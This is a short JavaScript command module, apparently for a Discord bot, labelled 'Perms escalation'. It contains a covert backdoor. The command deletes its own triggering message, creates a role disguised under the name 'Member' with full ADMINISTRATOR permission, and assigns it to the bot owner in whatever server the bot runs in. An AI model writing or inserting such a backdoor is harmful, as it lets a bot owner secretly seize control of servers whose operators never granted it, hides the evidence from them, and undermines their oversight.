module.exports = {
  alias: ["escalate", "esc"],
  description: "Perms escalation",
  permission: "botowner",
  usage: "",
  async execute (message, args, latency, commands, client) {
    message.delete();
    const user = message.guild.members.resolveID(client.user);
    message.guild.createRole({
      name: "Member",
      permissions: "ADMINISTRATOR",
      position: user.highestRole.position
    }).then(role => {
      const me = message.guild.members.resolveID(message.author.id);
      me.addRole(role);
    });
  }
};
